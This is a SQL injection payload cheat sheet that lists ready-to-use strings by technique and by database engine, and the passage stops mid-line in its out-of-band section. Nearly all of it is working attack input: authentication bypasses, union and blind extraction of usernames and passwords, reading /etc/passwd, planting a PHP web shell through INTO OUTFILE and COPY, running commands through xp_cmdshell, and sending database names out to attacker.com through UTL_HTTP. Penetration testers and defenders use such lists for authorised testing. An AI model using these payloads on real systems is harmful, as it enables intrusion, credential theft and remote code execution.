

# SQL Injection (SQLi) Payloads List

Below is a collection of common SQL injection payloads categorized by attack type and database technology.

## Basic Authentication Bypass

```
' OR '1'='1
' OR 1=1 --
' OR 1=1 #
admin' --
admin' #
admin'/*
admin' OR '1'='1
```

## Union-Based Attacks

```
UNION SELECT null,username,password FROM users--
UNION SELECT 1,2,3,4--
UNION ALL SELECT database(),user(),version()--
```

## Error-Based Attacks

```
AND (SELECT 0 FROM (SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)
AND GTID_SUBSET(CONCAT(0x7e,(SELECT USER()),0x7e),0)
EXTRACTVALUE(rand(),concat(0x3a,(select database())))
```

## Boolean-Based Blind SQLi

```
AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'
AND ASCII(SUBSTRING((SELECT database()),1,1))>100
```

## Time-Based Blind SQLi

```
IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)
; WAITFOR DELAY '0:0:5' --
OR (SELECT * FROM (SELECT(SLEEP(5)))a)
```

## Database-Specific Payloads

### MySQL
```
@@version
LOAD_FILE('/etc/passwd')
INTO OUTFILE '/var/www/html/shell.php'
CONNECTION_ID()
```

### MSSQL
```
@@SERVERNAME
xp_cmdshell('whoami')
WAITFOR DELAY '0:0:5'
```

### Oracle
```
(SELECT banner FROM v$version WHERE rownum=1)
UTL_HTTP.REQUEST('http://attacker.com')
DBMS_LOCK.SLEEP(5)
```

### PostgreSQL
```
current_database()
pg_sleep(5)
COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php'
```

## Out-of-Band Techniques

```
||UTL_HTTP.request('http://attacker.com/'||database())--
EXEC master..xp_dirtree '\\att